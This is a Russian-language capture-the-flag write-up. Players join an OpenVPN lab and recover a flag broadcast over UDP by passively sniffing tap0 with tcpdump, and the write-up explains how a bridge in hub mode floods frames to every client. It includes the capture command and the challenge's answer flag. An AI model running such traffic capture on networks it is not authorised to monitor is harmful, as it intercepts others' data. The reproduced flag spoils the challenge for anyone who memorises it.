## Описание задачи

Участники подключаются к OpenVPN-шлюзу и попадают в общий L2-сегмент (10.8.0.0/24). Внутри сети «жертва» (`10.8.0.2`) периодически рассылает UDP-датаграмму с HTTP-подобным payload'ом, содержащим флаг, на broadcast-адрес `10.8.0.255:80`. Так как мост работает в hub-режиме, все VPN-клиенты получают этот broadcast-фрейм.

---

## Решение

### Шаг 1 — Получить конфиг

Открыть портал, ввести никнейм, скачать `.ovpn` файл:

```
http://159.194.233.5:8080
```

### Шаг 2 — Установить инструменты и подключиться

```bash
sudo apt-get install -y openvpn tcpdump

sudo openvpn --config mynick.ovpn
```

Дождаться строки `Initialization Sequence Completed`.

Проверить IP:

```bash
ip addr show tap0
# inet 10.8.0.XX/24 ...
```

### Шаг 3 — Перехватить флаг

```bash
sudo tcpdump -i tap0 -A 'udp and dst port 80' 2>/dev/null | grep -o 'CTF{[^}]*}'
```

Через ≤30 секунд в выводе появится:

```
CTF{passive_sniff_on_bridge_wins_42}
```

## Использованные инструменты

- `openvpn` — подключение к VPN
- `tcpdump` — захват пакетов на интерфейсе `tap0`

## Как это работает

```
[victim 10.8.0.2] --UDP broadcast--> [br-ctfvpn, ageing_time=0 (hub)]
                                              |
                                            tap0
                                              |
                                        OpenVPN server
                                       /     |      \
                               player1  player2  player3
                               tap0     tap0     tap0
```

Мост `br-ctfvpn` настроен с `ageing_time=0` (hub-режим) — он не запоминает MAC-адреса и флудит каждый Ethernet-фрейм на все порты, включая `tap0`. OpenVPN форвардит broadcast-фреймы всем подключённым клиентам.
